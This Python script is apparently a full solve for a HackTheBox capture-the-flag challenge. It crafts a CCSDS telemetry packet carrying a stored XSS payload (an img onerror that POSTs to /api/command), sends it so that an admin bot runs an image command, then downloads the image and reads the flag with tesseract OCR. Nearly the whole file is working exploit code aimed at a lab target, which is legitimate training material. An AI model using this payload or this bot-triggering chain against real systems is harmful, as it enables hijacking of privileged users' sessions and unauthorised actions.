#!/usr/bin/env python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#           PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF SPACE CRAFT
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------
# HackTheBox - Groundstation_Breach - full solve
#
# Chain:
#  1. Craft a "valid" CCSDS telemetry packet whose ASCII payload is an XSS tag.
#  2. Push it to the telemetry TCP port. The admin bot's browser renders the
#     packet's text as HTML (innerHTML sink) and the onerror handler fires,
#     which calls /api/command { command: "acquire_image" } as the logged-in
#     admin.
#  3. acquire_image stamps the flag onto a PNG that is stored in the PUBLIC
#     /api/telemetry feed.
#  4. Download the image, OCR the flag with tesseract.
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import urllib.request
import subprocess
import argparse
import base64
import socket
import time
import json
import sys
import io
import re
import os

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Load application variables via JSON configuration or command-line
# Modified: N/A
# -------------------------------------------------------------------------------------

if len(sys.argv) == 2 and sys.argv[1].lstrip().startswith("{"):
    config = json.loads(sys.argv[1])
else:
    parser = argparse.ArgumentParser(description="Spacecraft tracking system")
    parser.add_argument("--host", required=True)
    parser.add_argument("--port", type=int, required=True)
    parser.add_argument("--port2", type=int, required=True)
    parser.add_argument("--spacecraft-id", type=int, required=False)
    parser.add_argument("--virtual-channel-id", type=int, required=False)
    parser.add_argument("--apid", type=int, required=False)
    parser.add_argument("--payload", required=False)
    parser.add_argument("--packet-count", type=int, required=False)
    parser.add_argument("--tc-packet-count", type=int, required=False)
    args = parser.parse_args()
    config = {
        "host": args.host,
        "port": args.port,
        "port2": args.port2,
        "spacecraft_id": args.spacecraft_id,
        "virtual_channel_id": args.virtual_channel_id,
        "apid": args.apid,
        "payload": args.payload,
        "packet_count": args.packet_count,
        "tc_packet_count": args.tc_packet_count,
    }

host = config["host"]
port = (config["port"])
port2 = (config["port2"])
spacecraft_id = (config["spacecraft_id"])
virtual_channel_id = (config["virtual_channel_id"])
apid = (config["apid"])
# user_payload = config["payload"].encode("utf-8")
packet_count = (config["packet_count"])
tc_packet_count = (config["tc_packet_count"])

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Define application variables
# Modified: N/A
# -------------------------------------------------------------------------------------

XSS = b"<img src=x onerror=\"fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({command:'acquire_image'})})\">"

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Create functional subroutines called from main.
# Modified: N/A
# -------------------------------------------------------------------------------------

def build_ccsds_packet(payload: bytes) -> bytes:
    apid = 1
    seq_count = 0
    pkt_len = len(payload) - 1
    header = bytes([(0 << 5) | (0 << 4) | (0 << 3) | ((apid >> 8) & 0x07),apid & 0xFF,(0b11 << 6) | ((seq_count >> 8) & 0x3F),seq_count & 0xFF,(pkt_len >> 8) & 0xFF,pkt_len & 0xFF,])
    return header + payload

def ask_value(argument, prompt, converter=str):
    if argument is not None:
        return argument
    while True:
        try:
            value = input(prompt).strip()
            return converter(value)
        except ValueError:
            print("Invalid value. Please try again.")

def restore_terminal_echo():
    if os.name == "posix":
        import termios
        import sys

        if sys.stdin.isatty():
            settings = termios.tcgetattr(sys.stdin.fileno())
            settings[3] |= termios.ECHO
            termios.tcsetattr(sys.stdin.fileno(),termios.TCSANOW,settings)

def main():
    restore_terminal_echo()
    print()
    WEB_HOST = host
    WEB_PORT = port
    TM_HOST = WEB_HOST
    TM_PORT = port2
    print()
    packet = build_ccsds_packet(XSS)
    print(f"[*] Sending {len(packet)}-byte packet to {TM_HOST}:{TM_PORT}")
    with socket.create_connection((TM_HOST, TM_PORT), timeout=10) as s:
        s.sendall(packet)
    print("[*] Waiting for admin bot to render packet and trigger acquire_image ...")
    for _ in range(15):
        time.sleep(2)
        with urllib.request.urlopen(f"http://{WEB_HOST}:{WEB_PORT}/api/telemetry", timeout=10) as resp:
            d = json.load(resp)
        if d.get("images"):
            img = d["images"][-1]
            print("[+] acquire_image triggered:", d["command_log"][-1])
            raw = base64.b64decode(img["data"])
            with open("flag_image.png", "wb") as f:
                f.write(raw)
            print(f"[+] Saved flag_image.png ({len(raw)} bytes)")
            break
    else:
        print("[-] No image appeared; bot may not be online yet - retry.")
        return
    try:
        from PIL import Image
        im = Image.open(io.BytesIO(raw)).convert("RGB")
        w, h = im.size
        im.crop((0, h - 90, w, h)).resize((w * 3, 270)).save("/tmp/_flag_crop.png")
    except Exception:
        pass
    print("[+] Enlarging image - Please wait.")
    subprocess.run(["magick", "flag_image.png", "-filter", "Lanczos","-resize", "400%", "enlarged.png"],check=True)
    result = subprocess.run(["tesseract", "enlarged.png", "stdout", "--psm", "6"],capture_output=True,text=True,check=True)
    match = re.search(r"HTB\{[^}]+\}", result.stdout)
    if match:
        print("[!] FLAG = " + match.group(0))
    else:
        print("[-] No HTB flag found")

if __name__ == "__main__":
    main()
